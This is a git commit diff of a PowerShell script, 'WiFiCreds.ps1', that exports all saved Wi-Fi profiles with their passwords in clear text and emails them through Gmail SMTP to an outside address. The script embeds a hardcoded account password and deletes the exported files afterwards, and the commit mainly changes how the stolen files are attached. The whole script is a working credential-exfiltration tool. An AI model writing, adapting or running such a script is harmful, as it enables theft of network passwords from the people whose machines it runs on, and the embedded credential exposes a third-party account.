9e37f4642e2c3f19314eb7cc4eab68146ac0ccb1
Zmk55 <oreoboi@gmail.com>
2022-08-25 17:25:36 -0500

    Update WiFiCreds.ps1

--- WiFiCreds.ps1
+++ WiFiCreds.ps1
@@ -1,19 +1,17 @@
 mkdir .creds
 netsh wlan export profile folder= .creds key=clear
-Compress-Archive -Path ~\.creds -DestinationPath  ~\creds.Zip
-rm -r .creds
 
 $From = "KiddyTheScript@gmail.com"
 $To = "KiddyTheScript@gmail.com"
-$Attachment = ~\creds.Zip
+$Attachment = (get-childitem ".\.creds").fullname
 $Subject = "creds"
 $Body = "Meow Meow"
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = "587"
 $secpasswd = ConvertTo-SecureString "rhznsrbplaffeeao" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential ("KiddyTheScript@gmail.com", $secpasswd)
-Send-MailMessage -SmtpServer smtp.gmail.com -port 587 -Credential $cred -UseSsl -From $from -To $To -Subject $Subject -Attachments ~\creds.Zip -Body $Body
+Send-MailMessage -SmtpServer smtp.gmail.com -port 587 -Credential $cred -UseSsl -From $from -To $To -Subject $Subject -Attachments $Attachment -Body $Body
 
-Remove-Item -Force creds.Zip
+rm -r .creds
 
 #Remove-Item WiFiCreds.ps1 -Force 
